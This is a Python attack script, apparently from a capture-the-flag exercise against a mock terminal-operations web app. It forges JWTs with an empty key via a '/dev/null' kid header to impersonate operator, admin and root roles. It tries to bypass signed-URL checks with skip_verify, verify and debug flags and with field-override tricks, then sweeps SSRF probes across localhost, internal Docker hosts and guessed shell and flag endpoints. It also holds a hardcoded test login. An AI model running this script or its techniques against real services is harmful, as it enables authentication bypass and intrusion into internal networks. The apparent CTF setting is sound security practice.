#!/usr/bin/env python3
"""round53 — CRITICAL: Test if skip_verify/verify/debug actually bypass signature check"""
import requests, time, json, hmac as hm, hashlib, base64

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
P9000 = f"http://{HOST}:9000"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
WRONG_SIG = "0000000000000000000000000000000000000000000000000000000000000000"

# ============================================================
print("="*70)
print("CRITICAL TEST: DOES skip_verify BYPASS SIGNATURE CHECK?")
print("="*70)

# Baseline: valid url + WRONG sig → should be 403
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": WRONG_SIG},
               headers=AUTH_OP, timeout=5)
    print(f"  [BASELINE] valid url + wrong sig: [{r.status_code}]")
except Exception as e:
    print(f"  [BASELINE] error: {e}")

# Test 1: wrong sig + skip_verify=True
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": WRONG_SIG, "skip_verify": True},
               headers=AUTH_OP, timeout=5)
    print(f"  [TEST 1] wrong sig + skip_verify=True: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  [TEST 1] error: {e}")

# Test 2: wrong sig + verify=False
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": WRONG_SIG, "verify": False},
               headers=AUTH_OP, timeout=5)
    print(f"  [TEST 2] wrong sig + verify=False: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  [TEST 2] error: {e}")

# Test 3: wrong sig + debug=True
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": WRONG_SIG, "debug": True},
               headers=AUTH_OP, timeout=5)
    print(f"  [TEST 3] wrong sig + debug=True: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  [TEST 3] error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("TEST: SSRF TO LOCALHOST:9000 WITH BYPASS FLAGS")
print("="*70)

ssrf_targets = [
    "http://localhost:9000/healthz",
    "http://127.0.0.1:9000/healthz",
    "http://localhost:9000/",
    "http://127.0.0.1:9000/",
    "http://localhost:3000/",
    "http://127.0.0.1:3000/api/auth/me",
    # Internal docker
    "http://172.18.0.5:3000/",
    "http://172.18.0.3:5432/",
    # gauge-gw on different paths
    "http://gauge-gw.internal:9100/",
    "http://gauge-gw.internal:9100/healthz",
    "http://gauge-gw.internal:9100/v1/",
    "http://gauge-gw.internal:9100/secret",
    "http://gauge-gw.internal:9100/flag",
    "http://gauge-gw.internal:9100/config",
    "http://gauge-gw.internal:9100/probe_secret",
    "http://gauge-gw.internal:9100/key",
    # Other possible internal services
    "http://terminal-db:5432/",
    "http://llehs:9000/",
    "http://shell:9000/",
    "http://llehs.internal:9000/",
    # Port 9000 container
    "http://localhost:9000/shell",
    "http://localhost:9000/exec",
    "http://localhost:9000/api",
    "http://localhost:9000/flag",
    "http://localhost:9000/secret",
    "http://localhost:9000/probe",
    "http://localhost:9000/api/shell",
    "http://localhost:9000/api/exec",
    "http://localhost:9000/llehs",
]

for target_url in ssrf_targets:
    # Try each bypass flag
    for flag_name, flag in [("skip_verify", {"skip_verify": True}),
                             ("verify=F", {"verify": False}),
                             ("debug", {"debug": True})]:
        try:
            payload = {"url": target_url, "sig": WRONG_SIG, **flag}
            r = S.post(f"{CASPI}/api/ops/probe",
                       json=payload, headers=AUTH_OP, timeout=5)
            if r.status_code == 200:
                print(f"  *** SSRF [{r.status_code}] {target_url} ({flag_name}): {r.text[:300]} ***")
                break
            elif r.status_code != 403:
                print(f"  [{r.status_code}] {target_url} ({flag_name}): {r.text[:100]}")
                break
        except Exception as e:
            if "timed out" not in str(e):
                print(f"  [ERR] {target_url}: {str(e)[:80]}")
            break

# ============================================================
print("\n\n"+"="*70)
print("TEST: NO SIG AT ALL + BYPASS FLAGS")
print("="*70)

# Maybe skip_verify works without sig field entirely?
for target_url in ["http://localhost:9000/healthz",
                    "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
                    KNOWN_URL]:
    for flag_name, flag in [("skip_verify", {"skip_verify": True}),
                             ("verify=F", {"verify": False})]:
        try:
            payload = {"url": target_url, **flag}  # NO sig field
            r = S.post(f"{CASPI}/api/ops/probe",
                       json=payload, headers=AUTH_OP, timeout=5)
            if r.status_code == 200:
                print(f"  *** [{r.status_code}] NO SIG + {flag_name} → {target_url}: {r.text[:200]} ***")
            else:
                print(f"  [{r.status_code}] NO SIG + {flag_name} → {target_url}: {r.text[:80]}")
        except Exception as e:
            print(f"  [ERR] {target_url}: {str(e)[:80]}")

# ============================================================
print("\n\n"+"="*70)
print("TEST: SIGN THEN MODIFY — URL IN BOTH FIELDS")
print("="*70)

# What if there's a url vs target vs dest field that overrides?
override_tests = [
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "target": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "dest": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "redirect": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "forward": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "proxy": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "location": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "next": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "callback": "http://localhost:9000/healthz"},
    {"url": KNOWN_URL, "sig": KNOWN_SIG, "return_url": "http://localhost:9000/healthz"},
    # URL as array — first for sig check, second for request
    {"url": [KNOWN_URL, "http://localhost:9000/healthz"], "sig": KNOWN_SIG},
]

for payload in override_tests:
    desc = [k for k in payload if k not in ("url", "sig")][0] if len(payload) > 2 else "url_array"
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
                   json=payload, headers=AUTH_OP, timeout=5)
        if r.status_code == 200:
            body = r.text[:200]
            # Check if response is from localhost:9000 (not gauge-gw)
            if "flow_m3h" not in body:
                print(f"  *** [{r.status_code}] {desc}: DIFFERENT RESPONSE: {body} ***")
            else:
                pass  # Same as normal probe, override didn't work
        elif r.status_code != 403 and r.status_code != 500:
            print(f"  [{r.status_code}] {desc}: {r.text[:100]}")
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  [ERR] {desc}: {str(e)[:80]}")

# ============================================================
print("\n\n"+"="*70)
print("GAUGE-GW DEEP ENUMERATION VIA VALID PROBE")
print("="*70)

# We can SSRF to gauge-gw via valid signed URLs
# But only the 5 known URLs work
# Let's extract max info from the valid probe responses

all_sigs = {
    "lm-01": ("http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
              "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    "tk-01": ("http://gauge-gw.internal:9100/v1/tanks/1/level",
              "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    "tk-02": ("http://gauge-gw.internal:9100/v1/tanks/2/level",
              "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
    "tk-03": ("http://gauge-gw.internal:9100/v1/tanks/3/level",
              "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3"),
    "tk-07": ("http://gauge-gw.internal:9100/v1/tanks/7/level",
              "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
}

for device, (url, sig) in all_sigs.items():
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
                   json={"url": url, "sig": sig},
                   headers=AUTH_OP, timeout=5)
        if r.status_code == 200:
            data = r.json()
            print(f"  {device}: status={data.get('status')} body={data.get('body','')[:200]}")
            # Check ALL response fields
            extra_keys = [k for k in data.keys() if k not in ('body', 'status')]
            if extra_keys:
                print(f"    EXTRA KEYS: {extra_keys} → {[data[k] for k in extra_keys]}")
    except Exception as e:
        print(f"  {device}: {str(e)[:80]}")

# ============================================================
print("\n\n"+"="*70)
print("PROBE SIGN — RESPONSE HEADER ANALYSIS")
print("="*70)

# Check ALL response headers from probe/sign and probe
try:
    r = S.get(f"{CASPI}/api/ops/probe/sign?device=lm-01", headers=AUTH_OP, timeout=5)
    print(f"  SIGN headers: {dict(r.headers)}")
    print(f"  SIGN body: {r.text}")
except Exception as e:
    print(f"  SIGN: {e}")

try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": KNOWN_SIG},
               headers=AUTH_OP, timeout=5)
    print(f"\n  PROBE headers: {dict(r.headers)}")
    print(f"  PROBE body: {r.text}")
except Exception as e:
    print(f"  PROBE: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PORTAL PAGE — 500 ERROR ANALYSIS")
print("="*70)

# /portal returns 500 with carrier JWT. Let's analyze the error
try:
    r = S.get(f"{CASPI}/portal",
              headers={"Authorization": f"Bearer {jwt_op()}"}, timeout=5)
    print(f"  /portal [operator] [{r.status_code}] ({len(r.text)} bytes)")
    if r.status_code == 500:
        print(f"  Body: {r.text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

# With carrier JWT (valid login)
try:
    # Login with registered account
    lr = S.post(f"{CASPI}/api/auth/login",
                json={"email": "ctf_fubznz@caspiterminal.kz", "password": "Ctffubznz2026!"},
                headers={"Content-Type": "application/json"}, timeout=5)
    print(f"\n  Login: [{lr.status_code}] {lr.text[:200]}")

    if lr.status_code == 200:
        # Get cookies/token
        cookies = dict(lr.cookies)
        print(f"  Cookies: {cookies}")

        # Try portal with session cookies
        pr = S.get(f"{CASPI}/portal", timeout=5)
        print(f"  /portal [session] [{pr.status_code}] ({len(pr.text)} bytes)")
        if pr.status_code == 200:
            # Extract all content
            import re
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', pr.text, re.DOTALL)
            for i, s in enumerate(scripts):
                if s.strip():
                    print(f"  PORTAL SCRIPT {i+1}:")
                    print(f"    {s.strip()[:500]}")

            # API URLs
            api_calls = re.findall(r'fetch\([\'"]([^\'"]+)[\'"]', pr.text)
            if api_calls:
                print(f"  PORTAL API calls: {api_calls}")

            # Full text content (minus HTML)
            text = re.sub(r'<[^>]+>', ' ', pr.text)
            text = ' '.join(text.split())[:500]
            print(f"  PORTAL text: {text}")
except Exception as e:
    print(f"  Login/Portal: {str(e)[:200]}")

# ============================================================
print("\n\n"+"="*70)
print("/api/auth/me — FULL USER DATA")
print("="*70)

# Check me endpoint with different roles
for role in ["operator", "admin", "carrier", "superadmin", "root"]:
    try:
        token = jwt_op() if role == "operator" else None
        h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
        p = json.dumps({"sub":"ctf","company":"X","role":role,
            "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
        m = b64u(h)+'.'+b64u(p)
        token = m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

        r = S.get(f"{CASPI}/api/auth/me",
                  headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"  [role={role}] [{r.status_code}]: {r.text[:200]}")
    except Exception as e:
        print(f"  [role={role}]: {str(e)[:80]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
